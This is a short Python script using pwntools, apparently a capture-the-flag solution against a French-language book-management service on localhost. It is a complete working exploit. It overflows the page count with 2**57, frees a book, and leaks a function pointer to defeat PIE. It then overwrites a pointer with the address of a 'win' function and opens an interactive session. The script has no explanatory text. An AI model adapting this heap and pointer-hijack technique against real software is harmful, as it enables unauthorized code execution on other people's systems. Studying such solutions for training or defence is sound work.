from pwn import *

r = remote('localhost', 4000)

r.sendlineafter(b"Quitter\n", b"1")
r.sendlineafter(b"livre ?\n", b"book1")
r.sendlineafter(b"pages ?\n", str(2**57).encode())

r.sendlineafter(b"Quitter\n", b"1")
r.sendlineafter(b"livre ?\n", b"book2")
r.sendlineafter(b"pages ?\n", b"10")

r.sendlineafter(b"Quitter\n", b"2")
r.sendlineafter(b"livre: ", b"0")

r.sendlineafter(b"Quitter\n", b"4")
r.recvuntil(b'"')
readptr_leak = r.recv(128) 
r.recvuntil(b'"\n')

read_page_offset = 0x00005555555551f9
PIE_base = u64(readptr_leak[32:40]) - read_page_offset

win_offset = 0x00005555555555b9
win = PIE_base + win_offset

payload = b"A" * 16 + b"B" * 16 + p64(win)

r.sendlineafter(b"Quitter\n", b"3")
r.sendlineafter(b"crire ?", payload) 

r.sendlineafter(b"Quitter\n", b"2")
r.sendlineafter(b"livre: ", b"1")

r.sendlineafter(b"Quitter\n", b"4") 

r.interactive()
